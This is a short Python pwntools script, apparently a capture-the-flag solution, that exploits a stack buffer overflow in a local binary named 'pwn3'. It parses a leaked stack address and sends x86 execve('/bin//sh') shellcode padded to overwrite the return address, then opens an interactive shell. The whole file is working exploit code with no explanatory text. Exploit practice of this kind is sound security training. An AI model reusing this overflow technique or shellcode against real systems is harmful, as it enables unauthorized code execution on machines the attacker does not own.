from pwn import *

r = process("./pwn3")

r.recvuntil("Take this, you might need it on your journey 0x")
leak = int(r.recvn(8), 16)
print hex(leak)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

r.sendline(shellcode + "A" * (298 - len(shellcode)) + "BBBB" + p32(leak))
r.interactive()